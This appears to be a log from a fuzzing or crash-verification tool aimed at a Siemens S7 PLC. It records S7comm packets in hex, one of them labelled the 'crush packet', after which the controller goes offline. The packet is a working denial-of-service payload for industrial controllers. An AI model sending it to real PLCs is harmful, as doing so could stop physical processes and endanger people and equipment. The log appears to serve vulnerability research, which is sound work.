[2021-12-19 19:56:08,695] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 19:56:08,742] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-12-19 19:56:08,742] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-12-19 19:56:08,743] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 19:56:08,743] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 48
[2021-12-19 19:56:08,745] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-12-19 19:56:08,958] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-12-19 19:56:09,162] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000400000800080001120411440100ff090004001c0000
[2021-12-19 19:56:09,366] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-12-19 19:56:09,569] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-12-19 19:56:09,771] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000700000800080001120411440100ff090004001c0000
[2021-12-19 19:56:09,988] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-12-19 19:56:10,192] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000900000800080001120411440100ff090004001c0000
[2021-12-19 19:56:10,395] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000a00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:10,598] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000b00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:10,801] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000c00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:11,008] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000d00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:11,215] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000e00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:11,420] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000f00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:11,625] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001000000800080001120411440100ff090004001c0000
[2021-12-19 19:56:11,830] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001100000800080001120411440100ff090004001c0000
[2021-12-19 19:56:12,035] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001200000800080001120411440100ff090004001c0000
[2021-12-19 19:56:12,241] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001300000800080001120411440100ff090004001c0000
[2021-12-19 19:56:12,457] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001400000800080001120411440100ff090004001c0000
[2021-12-19 19:56:12,661] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001500000800080001120411440100ff090004001c0000
[2021-12-19 19:56:12,878] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001600000800080001120411440100ff090004001c0000
[2021-12-19 19:56:13,081] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001700000800080001120411440100ff090004001c0000
[2021-12-19 19:56:13,286] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001800000800080001120411440100ff090004001c0000
[2021-12-19 19:56:13,491] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001900000800080001120411440100ff090004001c0000
[2021-12-19 19:56:13,695] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001a00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:13,900] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001b00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:14,107] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001c00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:14,310] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001d00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:14,516] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001e00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:14,720] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001f00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:14,922] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002000000800080001120411440100ff090004001c0000
[2021-12-19 19:56:15,126] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002100000800080001120411440100ff090004001c0000
[2021-12-19 19:56:15,329] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002200000800080001120411440100ff090004001c0000
[2021-12-19 19:56:15,535] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002300000800080001120411440100ff090004001c0000
[2021-12-19 19:56:15,739] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002400000800080001120411440100ff090004001c0000
[2021-12-19 19:56:15,945] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002500000800080001120411440100ff090004001c0000
[2021-12-19 19:56:16,163] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002600000800080001120411440100ff090004001c0000
[2021-12-19 19:56:16,365] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002700000800080001120411440100ff090004001c0000
[2021-12-19 19:56:16,571] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002800000800080001120411440100ff090004001c0000
[2021-12-19 19:56:16,774] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002900000800080001120411440100ff090004001c0000
[2021-12-19 19:56:16,977] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002a00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:17,194] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002b00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:17,397] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002c00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:17,615] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002d00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:17,823] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002e00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:18,040] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002f00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:18,245] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003000000800080001120411440100ff090004001c0000
[2021-12-19 19:56:18,450] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003100000800080001120411440100ff090004001c0000
[2021-12-19 19:56:19,011] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 19:56:19,012] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100003200000e00000401120a10010003000083000001
[2021-12-19 19:56:19,228] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003300000800080001120411440100ff090004001c0000
[2021-12-19 19:56:19,432] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003400000800080001120411440100ff090004001c0000
[2021-12-19 19:56:19,637] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003500000800080001120411440100ff090004001c0000
[2021-12-19 19:56:19,842] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003600000800080001120411440100ff090004001c0000
[2021-12-19 19:56:20,049] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003700000800080001120411440100ff090004001c0000
[2021-12-19 19:56:20,254] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003800000800080001120411440100ff090004001c0000
[2021-12-19 19:56:20,459] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003900000800080001120411440100ff090004001c0000
[2021-12-19 19:56:20,680] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003a00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:20,894] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003b00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:21,100] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003c00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:21,304] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003d00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:21,507] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003e00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:21,713] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003f00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:21,918] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004000000800080001120411440100ff090004001c0000
[2021-12-19 19:56:22,136] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004100000800080001120411440100ff090004001c0000
[2021-12-19 19:56:22,340] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004200000800080001120411440100ff090004001c0000
[2021-12-19 19:56:22,546] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004300000800080001120411440100ff090004001c0000
[2021-12-19 19:56:22,752] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004400000800080001120411440100ff090004001c0000
[2021-12-19 19:56:22,958] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004500000800080001120411440100ff090004001c0000
[2021-12-19 19:56:23,165] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004600000800080001120411440100ff090004001c0000
[2021-12-19 19:56:23,368] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004700000800080001120411440100ff090004001c0000
[2021-12-19 19:56:23,573] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004800000800080001120411440100ff090004001c0000
[2021-12-19 19:56:23,778] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004900000800080001120411440100ff090004001c0000
[2021-12-19 19:56:23,986] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004a00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:24,192] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004b00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:24,397] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004c00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:24,601] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004d00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:24,807] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004e00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:25,015] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004f00000800080001120411440100ff090004001c0000
[2021-12-19 19:56:25,222] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005000000800080001120411440100ff090004001c0000
[2021-12-19 19:56:25,428] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005100000800080001120411440100ff090004001c0000
[2021-12-19 19:56:25,633] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005200000800080001120411440100ff090004001c0000
[2021-12-19 19:56:25,837] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005300000800080001120411440100ff090004001c0000
[2021-12-19 19:56:26,044] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005400000800080001120411440100ff090004001c0000
[2021-12-19 19:56:26,249] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005500000800080001120411440100ff090004001c0000
[2021-12-19 19:56:26,453] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005600000800080001120411440100ff090004001c0000
[2021-12-19 19:56:26,660] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005700000800080001120411440100ff090004001c0000
[2021-12-19 19:56:26,866] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005800000800080001120411440100ff090004001c0000
[2021-12-19 19:56:27,073] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005900000800080001120411440100ff090004001c0000
[2021-12-19 19:56:27,229] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 19:56:27,276] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 19:56:39,319] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 19:56:39,320] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 88 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 19:56:44,591] [INFO] [verifyClient.connect] -> Close old socket!
[2021-12-19 19:56:44,591] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 19:56:46,280] [ERROR] [verifyClient.send_receive_packet] -> file descriptor cannot be a negative integer (-1)
[2021-12-19 19:56:46,284] [ERROR] [verifyClient.send_receive_s7_packet] -> file descriptor cannot be a negative integer (-1)
[2021-12-19 19:56:48,292] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 19:56:48,292] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 12
[2021-12-19 19:56:48,294] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 在一个非套接字上尝试了一个操作。
